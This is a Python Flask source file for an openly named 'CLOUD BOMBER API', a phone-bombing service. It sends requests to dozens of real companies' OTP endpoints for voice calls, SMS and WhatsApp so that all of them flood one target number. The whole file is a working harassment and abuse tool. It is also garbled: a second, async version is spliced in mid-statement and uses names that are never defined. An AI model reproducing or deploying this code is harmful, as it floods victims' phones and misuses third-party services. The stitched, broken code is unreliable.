# api/index.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import requests
import time

app = Flask(__name__)
CORS(app)

# ============================================================
#  13 CONFIRMED WORKING APIS
# ============================================================
APIS = [
    {
        "name": "Tata Capital Voice",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phone": p, "isOtpViaCallAtLogin": "true"}
    },
    {
        "name": "Goibibo Voice",
        "type": "Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phone": p}
    },
    {
        "name": "1MG Voice",
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"number": p, "otp_on_call": True}
    },
    {
        "name": "Swiggy Call",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"mobile": p}
    },
    {
        "name": "GoKwik SMS",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phone": p, "country": "in"}
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"mobileNo": p, "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
    },
    {
        "name": "PenPencil",
        "type": "SMS",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": p}
    },
    {
        "name": "Smytten",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phone": p, "email": "test@example.com"}
    },
    {
        "name": "MyHubble Money",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phoneNumber": p, "channel": "SMS"}
    },
    {
        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phone": p, "country_url_name": "in"}
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"phone": p, "signupPlatform": "NATIVE_ANDROID"}
    },
    {
        "name": "ShopClues SMS",
        "type": "SMS",
        "url": "https://api.shopclues.com/v1/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"mobile": p}
    },
    {
        "name": "NewMe SMS",
        "type": "SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": lambda p: {"mobile_number": p, "resend_otp_request": True}
    },
]

def hit_api(api, phone):
    try:
        url = api["url"]
        headers = api.get("headers", {"Content-Type": "application/json"})
        body = api["body"](phone)
        
        if api.get("method", "POST") == "POST":
            response = requests.post(url, json=body, headers=headers, timeout=10)
        else:
            response = requests.get(url, params=body, headers=headers, timeout=10)
        
        if response.status_code in [200, 201, 202, 204]:
            return {"name": api["name"], "type": api["type"], "status": "success", "code": response.status_code}
        else:
            return {"name": api["name"], "type": api["type"], "status": "failed", "code": response.status_code}
    except requests.Timeout:
        return {"name": api["name"], "type": api["type"], "status": "timeout", "code": 408}
    except Exception as e:
        return {"name": api["name"], "type": api["type"], "status": "error", "code": 500, "error": str(e)[:50]}

# ============================================================
#  ROUTES
# ============================================================
@app.route('/')
def home():
    return jsonify({
        "name": "CLOUD BOMBER API",
        "version": "8.0",
        "developer": "@ZEERYXFF",
        "status": "active",
        "total_apis": len(APIS),
        "endpoints": {
            "/num?phone=9876543210": "Send to all APIs"
        }
    })

@app.route('/num')
def send_to_number():
    phone = request.args.get('phone') or request.args.get('num')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number required"}), 400
    
    phone = ''.join(filter(str.isdigit, phone))
    if phone.startswith('91'):
        phone = phone[2:]
    
    if len(phone) != 10:
        return jsonify({"status": "error", "message": "Invalid phone number"}), 400
    
    start_time = time.time()
    results = []
    
    for api in APIS:
        result = hit_api(api, phone)
        results.append(result)
    
    elapsed = time.time() - start_time
    
    total = len(results)
    success = sum(1 for r in results if r.get("status") == "success")
    failed = total - success
    
    return jsonify({
        "status": "success",
        "number": phone,
        "total_apis": total,
        "success": success,
        "failed": failed,
        "success_rate": f"{round((success/total)*100, 1)}%",
        "time_taken": f"{round(elapsed, 2)}s",
        "results": results
    })

# ============================================================
#  VERCEL HANDLER
# ============================================================
from mangum import Mangum
handler = Mangum(app)        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p, "country_url_name": "in"}
    },
    {
        "name": "RentoMojo",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p}
    },
    {
        "name": "Khatabook",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p, "app_signature": "wk+avHrHZf2"}
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p, "signupPlatform": "NATIVE_ANDROID"}
    },
    {
        "name": "Cosmofeed",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p, "version": "1.4.28"}
    },
    {
        "name": "Spencer's",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p}
    },
    {
        "name": "Shopper's Stop",
        "type": "SMS",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p, "type": "SIGNIN_WITH_MOBILE"}
    },
    {
        "name": "Lifestyle Stores",
        "type": "SMS",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"signInMobile": p, "channel": "sms"}
    },
    {
        "name": "PokerBaazi",
        "type": "SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p, "mfa_channels": "phno"}
    },
    {
        "name": "My11Circle",
        "type": "SMS",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p, "mfa_channels": "phno"}
    },
    {
        "name": "RummyCircle",
        "type": "SMS",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p, "isPlaycircle": False}
    },
    {
        "name": "Meesho SMS",
        "type": "SMS",
        "url": "https://api.meesho.com/v1/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p}
    },
    {
        "name": "DealShare SMS",
        "type": "SMS",
        "url": "https://api.dealshare.in/v1/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p}
    },
    {
        "name": "CityMall SMS",
        "type": "SMS",
        "url": "https://api.citymall.in/v1/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p}
    },
    {
        "name": "ShopClues SMS",
        "type": "SMS",
        "url": "https://api.shopclues.com/v1/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"mobile": p}
    },
    {
        "name": "Snapdeal SMS",
        "type": "SMS",
        "url": "https://api.snapdeal.com/v1/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": p}
    },

    # ===== WhatsApp APIs (5) =====
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": p}}
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"country_code": "+91", "phone": p}
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"payload": {"allowWhatsapp": True, "mobile": f"+91{p}"}, "type": "mobile"}
    },
    {
        "name": "Gupshup WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.gupshup.io/sm/api/v1/msg",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"channel": "whatsapp", "source": "917834811114", "destination": f"91{p}", "message": "Your OTP is 123456"}
    },
    {
        "name": "Wati WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.wati.io/api/v1/sendTemplateMessage",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "body": lambda p: {"phone": f"91{p}", "templateName": "otp_verification"}
    },
]

# ============================================================
#  ASYNC HITTER
# ============================================================
async def hit_api(session, api, phone):
    try:
        url = api["url"]
        method = api.get("method", "POST")
        headers = api.get("headers", {"Content-Type": "application/json"})
        
        body = api.get("body")
        if callable(body):
            body = body(phone)
        
        if isinstance(body, dict) and headers.get("Content-Type") == "application/json":
            body = json.dumps(body)
        
        await asyncio.sleep(DELAY)
        
        async with session.request(
            method=method,
            url=url,
            headers=headers,
            data=body,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            ssl=False
        ) as response:
            status = response.status
            if status in [200, 201, 202, 204, 302, 303]:
                return {"name": api["name"], "type": api["type"], "status": "success", "code": status}
            else:
                return {"name": api["name"], "type": api["type"], "status": "failed", "code": status}
    except asyncio.TimeoutError:
        return {"name": api["name"], "type": api["type"], "status": "timeout", "code": 408}
    except Exception as e:
        return {"name": api["name"], "type": api["type"], "status": "error", "code": 500, "error": str(e)[:50]}

# ============================================================
#  SEND ALL
# ============================================================
async def send_all_apis(phone):
    async with aiohttp.ClientSession() as session:
        tasks = [hit_api(session, api, phone) for api in APIS]
        results = await asyncio.gather(*tasks)
    return results

# ============================================================
#  ROUTES
# ============================================================
@app.route('/')
def home():
    return jsonify({
        "name": "CLOUD BOMBER API",
        "version": "7.0",
        "developer": "@ZEERYXFF",
        "status": "active",
        "total_apis": len(APIS),
        "delay": f"{DELAY}s per API",
        "timeout": f"{TIMEOUT}s",
        "endpoints": {
            "/num?phone=9876543210": "Send to all APIs"
        }
    })

@app.route('/num')
def send_to_number():
    phone = request.args.get('phone') or request.args.get('num')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number required"}), 400
    
    phone = ''.join(filter(str.isdigit, phone))
    if phone.startswith('91'):
        phone = phone[2:]
    
    if len(phone) != 10:
        return jsonify({"status": "error", "message": "Invalid phone number"}), 400
    
    start_time = time.time()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    results = loop.run_until_complete(send_all_apis(phone))
    loop.close()
    
    elapsed = time.time() - start_time
    
    total = len(results)
    success = sum(1 for r in results if r.get("status") == "success")
    failed = total - success
    
    stats_by_type = {}
    for r in results:
        t = r.get("type", "Unknown")
        if t not in stats_by_type:
            stats_by_type[t] = {"total": 0, "success": 0, "failed": 0}
        stats_by_type[t]["total"] += 1
        if r.get("status") == "success":
            stats_by_type[t]["success"] += 1
        else:
            stats_by_type[t]["failed"] += 1
    
    return jsonify({
        "status": "success",
        "number": phone,
        "total_apis": total,
        "success": success,
        "failed": failed,
        "success_rate": f"{round((success/total)*100, 1)}%",
        "time_taken": f"{round(elapsed, 2)}s",
        "stats_by_type": stats_by_type,
        "results": results
    })

# ============================================================
#  VERCEL HANDLER
# ============================================================
from mangum import Mangum
handler = Mangum(app)
